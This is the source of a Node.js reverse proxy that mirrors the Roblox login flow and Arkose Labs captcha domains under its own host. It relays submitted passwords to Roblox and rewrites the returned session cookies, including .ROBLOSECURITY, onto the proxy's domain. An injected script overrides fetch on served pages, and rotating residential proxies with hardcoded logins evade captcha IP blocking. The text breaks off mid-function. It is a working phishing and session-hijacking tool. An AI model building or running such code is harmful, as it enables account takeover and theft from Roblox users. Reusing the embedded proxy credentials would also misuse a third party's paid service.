const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { spawn, execFile } = require('child_process');
const vm = require('vm');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - WITH RESIDENTIAL PROXY FOR ARKOSE');
console.log('='.repeat(60));

// ─────────────────────────────────────────────────────────────
// curl-impersonate auto-detection
// Priority: curl_chrome124 > curl-impersonate-chrome > curl
// Install: https://github.com/lwthiker/curl-impersonate
//   Quick install on Ubuntu/Debian:
//     curl -L https://github.com/lwthiker/curl-impersonate/releases/latest/download/curl-impersonate-chrome.x86_64-linux-gnu.tar.gz | tar xz
//     sudo mv curl_chrome124 /usr/local/bin/
// ─────────────────────────────────────────────────────────────
let CURL_BIN = 'curl'; // fallback

function detectCurlBin() {
    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl-impersonate-chrome', 'curl'];
    let idx = 0;
    function tryNext() {
        if (idx >= candidates.length) return;
        const bin = candidates[idx++];
        execFile(bin, ['--version'], { timeout: 3000 }, (err) => {
            if (!err) {
                CURL_BIN = bin;
                if (bin === 'curl') {
                    console.warn('⚠️  curl-impersonate NOT found — using plain curl. Arkose 403 may persist.');
                    console.warn('   Install: https://github.com/lwthiker/curl-impersonate/releases');
                } else {
                    console.log(`✅ curl-impersonate detected: ${bin}`);
                }
            } else {
                tryNext();
            }
        });
    }
    tryNext();
}
detectCurlBin();

// Residential proxies for Arkose Labs (to bypass datacenter IP blocking)
const RESIDENTIAL_PROXIES = [
    'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
    'http://104574_FmGRR_s_BAY283TIWZ05HV2A:HoxFFU3jQA@residential.pingproxies.com:8392',
    'http://104574_FmGRR_s_Y3QTLQRA0S49RUWK:HoxFFU3jQA@residential.pingproxies.com:8269',
    'http://104574_FmGRR_s_L8K0M14X3H8KAIOL:HoxFFU3jQA@residential.pingproxies.com:8221',
    'http://104574_FmGRR_s_Q4FLL3QJZ46JQ2YF:HoxFFU3jQA@residential.pingproxies.com:8977',
];

let proxyIndex = 0;
function getNextProxy() {
    const proxy = RESIDENTIAL_PROXIES[proxyIndex];
    proxyIndex = (proxyIndex + 1) % RESIDENTIAL_PROXIES.length;
    return proxy;
}

// Shared HTTPS agent with keep-alive for connection pooling
const httpsAgent = new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000,
    rejectUnauthorized: true
});

const httpAgent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000
});

// Domain map - Roblox APIs
const SUBDOMAIN_MAP = {
    // Core Roblox APIs
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
    'auth-token-service': 'https://auth-token-service.roblox.com',
    'hba-service':    'https://hba-service.roblox.com',
    'proof-of-work-service': 'https://proof-of-work-service.roblox.com',
    'account-security-service': 'https://account-security-service.roblox.com',
    'rotating-client-service': 'https://rotating-client-service.roblox.com',
    'guac-v2':        'https://guac-v2.roblox.com',
    'product-experimentation-platform': 'https://product-experimentation-platform.roblox.com',
    'otp-service':    'https://otp-service.roblox.com',
    'challenge':      'https://challenge.roblox.com',
    'captcha':        'https://captcha.roblox.com',
    'abuse':          'https://abuse.roblox.com',
    'client-telemetry': 'https://client-telemetry.roblox.com',
    'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
    'metrics':        'https://metrics.roblox.com',
    'locale':         'https://locale.roblox.com',
    'notification':   'https://notification.roblox.com',
    'realtime':       'https://realtime.roblox.com',
    'presence':       'https://presence.roblox.com',
    'friends':        'https://friends.roblox.com',
    'groups':         'https://groups.roblox.com',
    'inventory':      'https://inventory.roblox.com',
    'trades':         'https://trades.roblox.com',
    'billing':        'https://billing.roblox.com',
    'premium':        'https://premium.roblox.com',
    'badges':         'https://badges.roblox.com',
    'avatar':         'https://avatar.roblox.com',
    'develop':        'https://develop.roblox.com',
    'publish':        'https://publish.roblox.com',
    'voice':          'https://voice.roblox.com',
    'chat':           'https://chat.roblox.com',
    'privatemessages': 'https://privatemessages.roblox.com',
    'share':          'https://share.roblox.com',
    'ads':            'https://ads.roblox.com',
    'followings':     'https://followings.roblox.com',
    'engagementpayouts': 'https://engagementpayouts.roblox.com',
    'assetdelivery':  'https://assetdelivery.roblox.com',
    'gamepersistence': 'https://gamepersistence.roblox.com',
    'games':          'https://games.roblox.com',
    'textfilter':     'https://textfilter.roblox.com',
    'translations':   'https://translations.roblox.com',
    'users':          'https://users.roblox.com',
    'accountsettings': 'https://accountsettings.roblox.com',
    'adconfiguration': 'https://adconfiguration.roblox.com',
    'clientsettings': 'https://clientsettings.roblox.com',
    'clientsettingscdn': 'https://clientsettingscdn.roblox.com',
    'datametrics':    'https://datametrics.roblox.com',
    'usermoderation': 'https://usermoderation.roblox.com',
    'points':         'https://points.roblox.com',
    'thumbnails':     'https://thumbnails.roblox.com',
    
    // CRITICAL: rbxcdn.com domains for captcha
    'apis-rbxcdn':    'https://apis.rbxcdn.com',
    'captcha-rbxcdn': 'https://captcha.rbxcdn.com',
    'arkoselabs-rbxcdn': 'https://arkoselabs.roblox.com',
    
    // ARKOSE LABS (FunCaptcha) - Critical for captcha challenges
    'arkose-api':     'https://roblox-api.arkoselabs.com',
    'arkose-client':  'https://client-api.arkoselabs.com',
    'arkose-cdn':     'https://cdn.arkoselabs.com',
    'arkose-ssl':     'https://ssl.arkoselabs.com',
    'arkose-funcaptcha': 'https://funcaptcha.com',
    'arkose-fc':      'https://fc.arkoselabs.com',
    'arkose-fc-cdn':  'https://fc-cdn.arkoselabs.com',
    'arkose-game':    'https://game.arkoselabs.com',
    'arkose-tile':    'https://t.arkoselabs.com',
    'arkose-assets':  'https://assets.arkoselabs.com',
    'arkose-images':  'https://roblox-images.arkoselabs.com',
    'arkose-media':   'https://media.arkoselabs.com',
    'arkose-api2':    'https://api.arkoselabs.com',
    'arkose-data':    'https://data.arkoselabs.com',
    'arkose-logs':    'https://logs.arkoselabs.com',
    'arkose-metrics': 'https://metrics.arkoselabs.com',
    'arkose-settings': 'https://settings.arkoselabs.com',
    'arkose-verify':  'https://verify.arkoselabs.com',
    'arkose-challenge': 'https://challenge.arkoselabs.com',
    'arkose-session': 'https://session.arkoselabs.com',
    'arkose-token':   'https://token.arkoselabs.com',
    'arkose-pow':     'https://pow.arkoselabs.com',
    'arkose-blob':    'https://blob.arkoselabs.com',
    'arkose-config':  'https://config.arkoselabs.com',
    'arkose-render':  'https://render.arkoselabs.com',
    'arkose-static':  'https://static.arkoselabs.com',
    'arkose-www':     'https://www.arkoselabs.com',
};

// Reverse map for URL rewriting
const REVERSE_MAP = Object.fromEntries(
    Object.entries(SUBDOMAIN_MAP).map(([k, v]) => [v, k])
);

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'x-retry-attempt',
];

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    // Strip www. prefix for consistent cookie domain
    const cleanHost = host.replace(/^www\./, '');
    return cookies.map(cookie => {
        return cookie
            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
            .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
            .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
            .replace(/Domain=\.?funcaptcha\.com/gi, `Domain=.${cleanHost}`)
            .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
    });
}

function getDeviceId(req) {
    const cookies = req.headers.cookie || '';
    const match = cookies.match(/rbx-device-id=([^;]+)/);
    if (match) return match[1];
    return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
}

// Rewrite URLs in challenge metadata (including Arkose URLs)
function rewriteChallengeMetadata(metadata, host) {
    try {
        const decoded = Buffer.from(metadata, 'base64').toString('utf8');
        let data = JSON.parse(decoded);
        
        // Rewrite challenge URL if present
        if (data.challengeUrl) {
            data.challengeUrl = rewriteArkoseUrl(data.challengeUrl, host);
        }
        if (data.challengeBaseUrl) {
            data.challengeBaseUrl = rewriteArkoseUrl(data.challengeBaseUrl, host);
        }
        // Handle fcTokenUrl (Arkose specific)
        if (data.fcTokenUrl) {
            data.fcTokenUrl = rewriteArkoseUrl(data.fcTokenUrl, host);
        }
        
        return Buffer.from(JSON.stringify(data)).toString('base64');
    } catch (e) {
        console.log('   Failed to rewrite challenge metadata:', e.message);
        return metadata;
    }
}

// Rewrite Arkose Labs URLs to proxy
function rewriteArkoseUrl(url, host) {
    if (!url || typeof url !== 'string') return url;
    
    // All domains that need to be proxied
    const domains = [
        // rbxcdn domains
        ['https://apis.rbxcdn.com', `https://${host}/apis-rbxcdn`],
        ['https://captcha.rbxcdn.com', `https://${host}/captcha-rbxcdn`],
        ['https://arkoselabs.roblox.com', `https://${host}/arkoselabs-rbxcdn`],
        // Arkose Labs domains
        ['https://roblox-api.arkoselabs.com', `https://${host}/arkose-api`],
        ['https://client-api.arkoselabs.com', `https://${host}/arkose-client`],
        ['https://cdn.arkoselabs.com', `https://${host}/arkose-cdn`],
        ['https://ssl.arkoselabs.com', `https://${host}/arkose-ssl`],
        ['https://funcaptcha.com', `https://${host}/arkose-funcaptcha`],
        ['https://fc.arkoselabs.com', `https://${host}/arkose-fc`],
        ['https://fc-cdn.arkoselabs.com', `https://${host}/arkose-fc-cdn`],
        ['https://game.arkoselabs.com', `https://${host}/arkose-game`],
        ['https://t.arkoselabs.com', `https://${host}/arkose-tile`],
        ['https://assets.arkoselabs.com', `https://${host}/arkose-assets`],
        ['https://roblox-images.arkoselabs.com', `https://${host}/arkose-images`],
        ['https://media.arkoselabs.com', `https://${host}/arkose-media`],
        ['https://api.arkoselabs.com', `https://${host}/arkose-api2`],
        ['https://data.arkoselabs.com', `https://${host}/arkose-data`],
        ['https://logs.arkoselabs.com', `https://${host}/arkose-logs`],
        ['https://metrics.arkoselabs.com', `https://${host}/arkose-metrics`],
        ['https://settings.arkoselabs.com', `https://${host}/arkose-settings`],
        ['https://verify.arkoselabs.com', `https://${host}/arkose-verify`],
        ['https://challenge.arkoselabs.com', `https://${host}/arkose-challenge`],
        ['https://session.arkoselabs.com', `https://${host}/arkose-session`],
        ['https://token.arkoselabs.com', `https://${host}/arkose-token`],
        ['https://pow.arkoselabs.com', `https://${host}/arkose-pow`],
        ['https://blob.arkoselabs.com', `https://${host}/arkose-blob`],
        ['https://config.arkoselabs.com', `https://${host}/arkose-config`],
        ['https://render.arkoselabs.com', `https://${host}/arkose-render`],
        ['https://static.arkoselabs.com', `https://${host}/arkose-static`],
        ['https://www.arkoselabs.com', `https://${host}/arkose-www`],
        // Roblox challenge domain
        ['https://challenge.roblox.com', `https://${host}/challenge`],
    ];
    
    for (const [from, to] of domains) {
        if (url.startsWith(from)) {
            return url.replace(from, to);
        }
    }
    return url;
}

async function doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, maxRetries = 2) {
    let lastError;
    for (let i = 0; i <= maxRetries; i++) {
        try {
            return await doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders);
        } catch (err) {
            lastError = err;
            if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNREFUSED') {
                console.log(`   Retry ${i + 1}/${maxRetries} after ${err.code}...`);
                await new Promise(r => setTimeout(r, 500 * (i + 1)));
                continue;
            }
            throw err;
        }
    }
    throw lastError;
}

function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
    return new Promise((resolve, reject) => {
        const bodyBuf = Buffer.from(bodyStr, 'utf8');

        const headers = {
            'Content-Type':    'application/json;charset=UTF-8',
            'Content-Length':  bodyBuf.length,
            'Accept':          'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      ua || BROWSER_UA,
            'Connection':      'keep-alive',
        };

        const forwardHeaders = [
            'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
            ...CHALLENGE_HEADERS
        ];
        for (const h of forwardHeaders) {
            if (extraHeaders[h]) headers[h] = extraHeaders[h];
        }

        if (cookieHeader) headers['Cookie'] = cookieHeader;
        if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

        const hasChallengeSolution = !!(extraHeaders['rblx-challenge-metadata'] && extraHeaders['rblx-challenge-id']);
        console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Challenge: ${hasChallengeSolution ? 'YES' : 'NO'}`);

        const options = {
            hostname: 'auth.roblox.com',
            path:     '/v2/login',
            method:   'POST',
            headers,
            agent:    httpsAgent,
        };

        const reqOut = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({
                status:  res.statusCode,
                headers: res.headers,
                body:    data,
            }));
        });

        reqOut.on('error', reject);
        reqOut.write(bodyBuf);
        reqOut.end();
    });
}

// =========================
// LOGIN HANDLER
// =========================
app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).send('Method not allowed');
    }

    const host = req.headers.host || 'localhost';
    const ua = req.headers['user-agent'] || BROWSER_UA;
    const incomingCookies = req.headers['cookie'] || '';
    const origin = req.headers['origin'] || `https://${host}`;
    const deviceId = getDeviceId(req);

    const hasChallengeSolution = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
    const hasChallengeId = req.headers['rblx-challenge-id'];
    console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
    
    // Debug: Log all incoming headers for login requests
    console.log('   All incoming headers:');
    for (const [k, v] of Object.entries(req.headers)) {
        if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx') || k.includes('rblx')) {
            const displayValue = typeof v === 'string' 
                ? (v.length > 100 ? v.substring(0, 100) + '...' : v)
                : v;
            console.log(`     ${k}: ${displayValue}`);
        }
    }
    
    // Try to decode challenge metadata for debugging
    if (req.headers['rblx-challenge-metadata']) {
        try {
            const decoded = Buffer.from(req.headers['rblx-challenge-metadata'], 'base64').toString('utf8');
            const meta = JSON.parse(decoded);
            console.log('   Decoded challenge metadata:', meta);
        } catch(e) {
            console.log('   Failed to decode challenge metadata:', e.message);
        }
    }

    try {
        const bodyStr = req.body.toString('utf8');

        if (hasChallengeSolution) {
            console.log('   Forwarding challenge solution to Roblox...');

            let result = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
            console.log(`   Challenge login attempt 1: ${result.status}`);

            if (result.status === 403 && result.headers['x-csrf-token']) {
                const csrfToken = result.headers['x-csrf-token'];
                console.log(`   Got CSRF token, retrying...`);

                let cookieHeader = incomingCookies;
                if (result.headers['set-cookie']) {
                    const extra = result.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                }

                result = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
                console.log(`   Challenge login attempt 2: ${result.status}`);
            }

            if (result.status === 200) {
                console.log('✅ LOGIN SUCCESS (with challenge)');
            } else {
                console.log(`❌ LOGIN FAILED: ${result.status}`);
                if (result.headers['rblx-challenge-id']) {
                    console.log('   New challenge required');
                }
            }

            return forwardResponse(res, result, host, origin, deviceId);
        }

        const first = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
        console.log(`   Step 1: ${first.status} | CSRF: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);

        if (!first.headers['x-csrf-token']) {
            return forwardResponse(res, first, host, origin, deviceId);
        }

        const csrfToken = first.headers['x-csrf-token'];
        let cookieHeader = incomingCookies;
        if (first.headers['set-cookie']) {
            const extra = first.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
        }

        const second = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
        console.log(`   Step 2: ${second.status}`);

        let finalResponse = second;
        if (second.status === 403 && second.headers['x-csrf-token'] && second.headers['x-csrf-token'] !== csrfToken) {
            const csrfToken2 = second.headers['x-csrf-token'];
            console.log(`   Token rotated, retrying...`);

            if (second.headers['set-cookie']) {
                const extra = second.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }

            const third = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken2, ua, req.headers);
            console.log(`   Step 3: ${third.status}`);
            finalResponse = third;
        }

        if (finalResponse.status === 200) {
            console.log('✅ LOGIN SUCCESS');
        } else if (finalResponse.status === 403 && finalResponse.headers['rblx-challenge-id']) {
            console.log('   🧩 Challenge required');
        } else {
            console.log(`❌ Response: ${finalResponse.status}`);
        }

        forwardResponse(res, finalResponse, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
});

function forwardResponse(res, response, host, origin, deviceId) {
    const status = response.status;
    let body = response.body;
    const headers = response.headers;

    const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' : 
                        headers['rbx-challenge-metadata'] ? 'rbx-challenge-metadata' : null;
    if (metadataKey) {
        const original = headers[metadataKey];
        const rewritten = rewriteChallengeMetadata(original, host);
        if (rewritten !== original) {
            console.log('   Rewrote challenge metadata URLs');
            headers[metadataKey] = rewritten;
        }
    }

    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));

    const headersToForward = [
        'x-csrf-token',
        'rblx-challenge-id',
        'rblx-challenge-type', 
        'rblx-challenge-metadata',
        'content-type',
        'cache-control',
    ];
    
    for (const key of headersToForward) {
        if (headers[key]) {
            res.set(key, headers[key]);
        }
    }

    const cookies = headers['set-cookie'];
    let allCookies = rewriteCookies(cookies, host) || [];

    // Confirm whether Roblox returned a .ROBLOSECURITY session cookie
    const hasRobloSecurity = (cookies || []).some(c => c.includes('.ROBLOSECURITY'));
    if (hasRobloSecurity) {
        const raw = (cookies || []).find(c => c.includes('.ROBLOSECURITY')) || '';
        const preview = raw.split(';')[0].substring(0, 40) + '...';
        console.log(`✅ .ROBLOSECURITY received — login confirmed! (${preview})`);
    } else if (status === 200) {
        console.log(`⚠️  Login returned 200 but NO .ROBLOSECURITY — silent failure`);
    }
    
    if (deviceId) {
        allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
    }
    
    if (allCookies.length > 0) {
        res.set('Set-Cookie', allCookies);
    }

    if (!headers['content-type']) {
        res.set('Content-Type', 'application/json');
    }

    res.status(status).send(body);
}

function buildInjectedScript(host) {
    // Strip www. prefix for consistent URL rewriting
    const cleanHost = host.replace(/^www\./, '');
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${cleanHost}/${prefix}`)}]`)
        .join(',');

    return `<script>
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${cleanHost}`)};
    var DOMAIN_MAP = [${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com", PROXY_HOST],
        ["https://roblox.com", PROXY_HOST],
        ["http://roblox.com", PROXY_HOST]
    ];
    
    // Arkose Labs domains for captcha - EXTENSIVE LIST
    var ARKOSE_DOMAINS = [
        // rbxcdn domains (CRITICAL!)
        ["https://apis.rbxcdn.com", PROXY_HOST + "/apis-rbxcdn"],
        ["https://captcha.rbxcdn.com", PROXY_HOST + "/captcha-rbxcdn"],
        ["https://arkoselabs.roblox.com", PROXY_HOST + "/arkoselabs-rbxcdn"],
        // Arkose Labs domains
        ["https://roblox-api.arkoselabs.com", PROXY_HOST + "/arkose-api"],
        ["https://client-api.arkoselabs.com", PROXY_HOST + "/arkose-client"],
        ["https://cdn.arkoselabs.com", PROXY_HOST + "/arkose-cdn"],
        ["https://ssl.arkoselabs.com", PROXY_HOST + "/arkose-ssl"],
        ["https://funcaptcha.com", PROXY_HOST + "/arkose-funcaptcha"],
        ["https://fc.arkoselabs.com", PROXY_HOST + "/arkose-fc"],
        ["https://fc-cdn.arkoselabs.com", PROXY_HOST + "/arkose-fc-cdn"],
        ["https://game.arkoselabs.com", PROXY_HOST + "/arkose-game"],
        ["https://t.arkoselabs.com", PROXY_HOST + "/arkose-tile"],
        ["https://assets.arkoselabs.com", PROXY_HOST + "/arkose-assets"],
        ["https://roblox-images.arkoselabs.com", PROXY_HOST + "/arkose-images"],
        ["https://media.arkoselabs.com", PROXY_HOST + "/arkose-media"],
        ["https://api.arkoselabs.com", PROXY_HOST + "/arkose-api2"],
        ["https://data.arkoselabs.com", PROXY_HOST + "/arkose-data"],
        ["https://logs.arkoselabs.com", PROXY_HOST + "/arkose-logs"],
        ["https://metrics.arkoselabs.com", PROXY_HOST + "/arkose-metrics"],
        ["https://settings.arkoselabs.com", PROXY_HOST + "/arkose-settings"],
        ["https://verify.arkoselabs.com", PROXY_HOST + "/arkose-verify"],
        ["https://challenge.arkoselabs.com", PROXY_HOST + "/arkose-challenge"],
        ["https://session.arkoselabs.com", PROXY_HOST + "/arkose-session"],
        ["https://token.arkoselabs.com", PROXY_HOST + "/arkose-token"],
        ["https://pow.arkoselabs.com", PROXY_HOST + "/arkose-pow"],
        ["https://blob.arkoselabs.com", PROXY_HOST + "/arkose-blob"],
        ["https://config.arkoselabs.com", PROXY_HOST + "/arkose-config"],
        ["https://render.arkoselabs.com", PROXY_HOST + "/arkose-render"],
        ["https://static.arkoselabs.com", PROXY_HOST + "/arkose-static"],
        ["https://www.arkoselabs.com", PROXY_HOST + "/arkose-www"],
    ];
    
    // Combine all domains — sort longest-first so specific subdomains match before shorter ones
    var ALL_DOMAINS = DOMAIN_MAP.concat(ARKOSE_DOMAINS).sort(function(a, b) {
        return b[0].length - a[0].length;
    });
    
    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        
        // Handle protocol-relative URLs
        if (url.indexOf('//') === 0) {
            url = 'https:' + url;
        }
        
        for (var i = 0; i < ALL_DOMAINS.length; i++) {
            var from = ALL_DOMAINS[i][0], to = ALL_DOMAINS[i][1];
            if (url.indexOf(from) === 0) return to + url.slice(from.length);
        }
        return url;
    }
    
    // CRITICAL: Also rewrite protocol-relative URLs in the page
    function rewriteProtocolRelativeUrls() {
        // Find all elements with src or href attributes
        var allElements = document.querySelectorAll('*');
        for (var i = 0; i < allElements.length; i++) {
            var el = allElements[i];
            
            // Check src attribute
            if (el.src && el.src.indexOf('//arkoselabs') !== -1) {
                var newSrc = rewriteUrl(el.src);
                if (newSrc !== el.src) {
                    el.src = newSrc;
                }
            }
            
            // Check href attribute
            if (el.href && el.href.indexOf('//arkoselabs') !== -1) {
                var newHref = rewriteUrl(el.href);
                if (newHref !== el.href) {
                    el.href = newHref;
                }
            }
            
            // Check data-src attribute
            if (el.dataset && el.dataset.src && el.dataset.src.indexOf('//arkoselabs') !== -1) {
                var newDataSrc = rewriteUrl(el.dataset.src);
                if (newDataSrc !== el.dataset.src) {
                    el.dataset.src = newDataSrc;
                }
            }
        }
    }

    // Load challenge state from sessionStorage (survives page reloads)
    window.__rblxChallengeId = sessionStorage.getItem('__rblxChallengeId') || null;
    window.__rblxChallengeType = sessionStorage.getItem('__rblxChallengeType') || null;
    window.__rblxUserId = sessionStorage.getItem('__rblxUserId') || null;
    window.__rblxBrowserTrackerId = sessionStorage.getItem('__rblxBrowserTrackerId') || null;
    window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
    window.__rblxChallengeToken = sessionStorage.getItem('__rblxChallengeToken') || null;
    window.__rblxCaptchaToken = sessionStorage.getItem('__rblxCaptchaToken') || null;
    
    if (window.__rblxChallengeId) {
        log('Restored challenge state from sessionStorage', {
            id: window.__rblxChallengeId, 
            type: window.__rblxChallengeType,
            solved: window.__rblxChallengeSolved,
            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
        });
    }

    function log(msg, data) {
        console.log('[Proxy]', msg, data || '');
    }
    
    function saveChallengeState() {
        if (window.__rblxChallengeId) sessionStorage.setItem('__rblxChallengeId', window.__rblxChallengeId);
        if (window.__rblxChallengeType) sessionStorage.setItem('__rblxChallengeType', window.__rblxChallengeType);
        if (window.__rblxUserId) sessionStorage.setItem('__rblxUserId', window.__rblxUserId);
        if (window.__rblxBrowserTrackerId) sessionStorage.setItem('__rblxBrowserTrackerId', window.__rblxBrowserTrackerId);
        if (window.__rblxChallengeToken) sessionStorage.setItem('__rblxChallengeToken', window.__rblxChallengeToken);
        if (window.__rblxCaptchaToken) sessionStorage.setItem('__rblxCaptchaToken', window.__rblxCaptchaToken);
        sessionStorage.setItem('__rblxChallengeSolved', window.__rblxChallengeSolved ? 'true' : 'false');
    }

    function constructSolutionMetadata() {
        // Check if we have a captcha token (for captcha challenges)
        if (window.__rblxCaptchaToken && window.__rblxChallengeId) {
            var data = {
                unifiedCaptchaId: window.__rblxChallengeId,
                captchaToken: window.__rblxCaptchaToken,
                actionType: "Login"
            };
            var encoded = btoa(JSON.stringify(data));
            log('Constructed CAPTCHA solution metadata', {encoded: encoded.substring(0, 50) + '...'});
            return encoded;
        }
        
        // Standard challenge metadata (for proofofwork, etc.)
        if (!window.__rblxChallengeId || !window.__rblxUserId) {
            log('Cannot construct metadata - missing challengeId or userId', {
                challengeId: window.__rblxChallengeId, 
                userId: window.__rblxUserId
            });
            return null;
        }
        var data = {
            userId: window.__rblxUserId,
            challengeId: window.__rblxChallengeId,
            browserTrackerId: window.__rblxBrowserTrackerId || ''
        };
        var encoded = btoa(JSON.stringify(data));
        log('Constructed solution metadata', {data: data, encoded: encoded.substring(0, 50) + '...'});
        return encoded;
    }
    
    // Debug: Log challenge state periodically
    setInterval(function() {
        if (window.__rblxChallengeId) {
            log('Challenge state', {
                id: window.__rblxChallengeId, 
                type: window.__rblxChallengeType, 
                solved: window.__rblxChallengeSolved,
                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
            });
        }
    }, 5000);

    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        var url = typeof resource === 'string' ? resource : resource.url;
        var rewrittenUrl = rewriteUrl(url);
        
        init = init || {};
        init.credentials = 'include';

        // AGGRESSIVE: Always check for login endpoint and add challenge headers if available
        var isLoginRequest = url.includes('/v2/login') || url.includes('/auth-api/v2/login') || rewrittenUrl.includes('/auth-api/v2/login');
        var isChallengeContinue = url.includes('challenge/v1/continue') || rewrittenUrl.includes('challenge/v1/continue');
        var isArkoseRequest = url.includes('arkoselabs') || url.includes('funcaptcha') || rewrittenUrl.includes('arkose');
        
        if (isArkoseRequest) {
            log('Arkose request detected:', {original: url, rewritten: rewrittenUrl});
        }
        
        if (isLoginRequest) {
            log('Login request detected!', {
                url: url, 
                rewritten: rewrittenUrl,
                solved: window.__rblxChallengeSolved,
                hasId: !!window.__rblxChallengeId,
                hasUserId: !!window.__rblxUserId,
                hasCaptchaToken: !!window.__rblxCaptchaToken
            });
            
            // If we have challenge data, ALWAYS add it to login requests
            if (window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
                var solutionMetadata = constructSolutionMetadata();
                if (solutionMetadata) {
                    init.headers = init.headers || {};
                    // If resource is a Request, copy its headers first
                    if (typeof resource !== 'string' && resource.headers) {
                        resource.headers.forEach(function(value, key) {
                            if (!init.headers[key]) init.headers[key] = value;
                        });
                    }
                    init.headers['rblx-challenge-id'] = window.__rblxChallengeId;
                    init.headers['rblx-challenge-type'] = window.__rblxChallengeType || 'chef';
                    init.headers['rblx-challenge-metadata'] = solutionMetadata;
                    init.headers['x-retry-attempt'] = '1';
                    log('ADDED challenge headers to login!', {id: window.__rblxChallengeId, type: window.__rblxChallengeType});
                }
            } else {
                log('No challenge data available for login');
            }
        }
        
        // Handle challenge continue requests - MUST include rblx-challenge-id header
        if (isChallengeContinue) {
            log('Challenge continue request detected', {url: url});
            if (window.__rblxChallengeId) {
                init.headers = init.headers || {};
                init.headers['rblx-challenge-id'] = window.__rblxChallengeId;
                init.headers['rblx-challenge-type'] = window.__rblxChallengeType || 'captcha';
                log('Added rblx-challenge-id to challenge/continue', {id: window.__rblxChallengeId});
            }
        }
        
        // Now create the resource with merged headers
        if (typeof resource === 'string') {
            resource = rewrittenUrl;
